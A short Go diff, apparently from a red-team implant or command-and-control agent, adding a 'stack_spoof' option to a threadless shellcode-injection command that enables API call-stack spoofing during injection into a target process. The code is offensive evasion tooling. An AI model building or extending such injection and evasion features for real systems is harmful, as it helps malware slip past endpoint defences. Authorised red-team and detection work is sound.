@@ -206,6 +206,7 @@ func (c *ThreadlessInjectCommand) Execute(task structs.Task) structs.CommandResu
 		PID          int    `json:"pid"`
 		DLLName      string `json:"dll_name"`
 		FunctionName string `json:"function_name"`
+		StackSpoof   bool   `json:"stack_spoof"`
 	}
 
 	params, parseErr := unmarshalParams[threadlessInjectArgs](task)
@@ -230,6 +231,11 @@ func (c *ThreadlessInjectCommand) Execute(task structs.Task) structs.CommandResu
 
 	if len(shellcode) == 0 {
 		return errorResult("Shellcode is empty")
+	}
+
+	if params.StackSpoof {
+		SetAPISpoofEnabled(true)
+		defer SetAPISpoofEnabled(false)
 	}
 
 	// Perform threadless injection
